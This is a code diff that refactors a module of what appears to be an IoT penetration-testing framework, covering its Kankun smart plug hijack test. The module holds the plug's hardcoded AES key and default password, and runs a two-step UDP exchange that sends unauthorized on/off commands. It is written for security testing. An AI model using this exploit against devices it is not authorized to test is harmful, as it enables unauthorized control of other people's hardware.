@@ -6,6 +6,10 @@ from Crypto.Cipher import AES  # nosec
 
 from expliot.core.tests.test import TCategory, Test, TLog, TTarget
 
+DEFAULT_PORT = 27431
+DEFAULT_PASS = "nopassword"
+AES_KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"
+
 
 # pylint: disable=bare-except
 class KHijack(Test):
@@ -35,9 +39,10 @@ class KHijack(Test):
         self.argparser.add_argument(
             "-p",
             "--rport",
-            default=27431,
+            default=DEFAULT_PORT,
             type=int,
-            help="Port number of the smart plug service. Default is 27431",
+            help="Port number of the smart plug service. Default "
+                 "is {}".format(DEFAULT_PORT),
         )
         self.argparser.add_argument(
             "-m",
@@ -49,8 +54,9 @@ class KHijack(Test):
         self.argparser.add_argument(
             "-w",
             "--passwd",
-            default="nopassword",
-            help='The password (if any) for Kankun. Default is the string "nopassword"',
+            default=DEFAULT_PASS,
+            help="The password (if any) for Kankun. Default is the "
+                 "string '{}'".format(DEFAULT_PASS),
         )
         self.argparser.add_argument(
             "-c",
@@ -59,36 +65,37 @@ class KHijack(Test):
             help="The command to send to the smartplug. Valid commands are on / off",
         )
 
-        self.key = "fdsl;mewrjope456fds4fbvfnjwaugfo"
-
-    def cipher(self, string, encrypt=True):
+    @staticmethod
+    def cipher(string, encrypt=True):
         """
         Encrypt/Decrypt a string using the known AES key of the smart plug.
 
-        :param string: The string to encrypt or decrypt
-        :param encrypt: True means encrypt (default), false means decrypt
-        :return: The encrypted/decrypted string
+        Args:
+            string(str): The string to encrypt or decrypt
+            encrypt(bool): True means encrypt (default), false means decrypt
+        Returns:
+            str: The encrypted/decrypted string
         """
-        aesobj = AES.new(self.key, AES.MODE_ECB)
+        aesobj = AES.new(AES_KEY, AES.MODE_ECB)
         if string:
             # AES requires the input length to be in multiples of 16
             while len(string) % 16 != 0:
                 string = string + " "
             if encrypt is True:
                 return aesobj.encrypt(string)
-
             return aesobj.decrypt(string)
-
         return None
 
     def send_recv(self, ip_addr, port, message):
         """
         Send and then receive encrypted data to/from the smart plug.
 
-        :param ip: The IP address of the smartplug
-        :param port: Port number of the listening service
-        :param message: The plaintext message
-        :return: The response received from the smart plug
+        Args:
+            ip_addr(str): The IP address of the smartplug
+            port(int): Port number of the listening service
+            message(str): The plaintext message
+        Returns:
+            str: The response received from the smart plug
         """
         ret = None
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -105,11 +112,13 @@ class KHijack(Test):
 
     def createmsg(self, cmd, cid=None):
         """
-        Create the command message to be sent to the the smartplug
+        Create the command message to be sent to the the smart plug
 
-        :param cmd: the command to send - open/close/confirm
-        :param cid: confirmation id used in confirm command
-        :return: The command message
+        Args:
+            cmd(str): the command to send - open/close/confirm
+            cid(str): confirmation id used in confirm command
+        Returns:
+            str: The command message
         """
         msg = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)
         if cmd == "open":
@@ -124,20 +133,22 @@ class KHijack(Test):
     def get_confirmid(msg):
         """
         Extract the confirmation id from the response message
-        :param self:
-        :param m: The response message
-        :return: The confirmation id
+
+        Args:
+            msg(str): The response message
+        Returns:
+            str: The confirmation id, if found or None
         """
         cid = re.search(
             r"confirm#(\w+)", msg.decode("utf-8")
         )  # get the confirmation ID number only!!
         if cid is not None:
             return cid.group(1)
-
         return None
 
     def execute(self):
         """Execute the test."""
+
         TLog.generic(
             "Sending Unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
                 self.args.cmd, self.args.rhost, self.args.rport
@@ -158,17 +169,16 @@ class KHijack(Test):
             return
         msg = self.createmsg(cmd_op)
         ret = None
-        TLog.trydo("Sending {} command: ({})".format(cmd_op, msg))
         # Step 1: Send command and receive the confirmation ID response
         ret = self.send_recv(self.args.rhost, self.args.rport, msg)
+        self.output_handler(command=msg)
         if ret is None:
             self.result.setstatus(
                 passed=False,
                 reason="Communication error while sending message({})".format(msg),
             )
             return
-
-        TLog.success("Received response: ({})".format(ret.decode("utf-8")))
+        self.output_handler(response=ret.decode("utf-8"))
         # Get the confirmation ID
         cid = self.get_confirmid(ret)
         if cid is None:
@@ -177,15 +187,15 @@ class KHijack(Test):
                 reason="Couldn't extract confirmation id from ({})".format(ret),
             )
             return
-        TLog.success("Received Confirmation ID: ({})".format(cid))
+        self.output_handler(received_confirmation_id=cid)
         msg = self.createmsg("confirm", cid)
-        TLog.trydo("Sending confirm command: ({})".format(msg))
         # Step 2: Send Confirmation command with the confirmation ID and receive ack response
         ret = self.send_recv(self.args.rhost, self.args.rport, msg)
+        self.output_handler(command=msg)
         if ret is None:
             self.result.setstatus(
                 passed=False,
                 reason="Communication error while sending message({})".format(msg),
             )
             return
-        TLog.success("Received response: ({})".format(ret.decode("utf-8")))
+        self.output_handler(response=ret.decode("utf-8"))
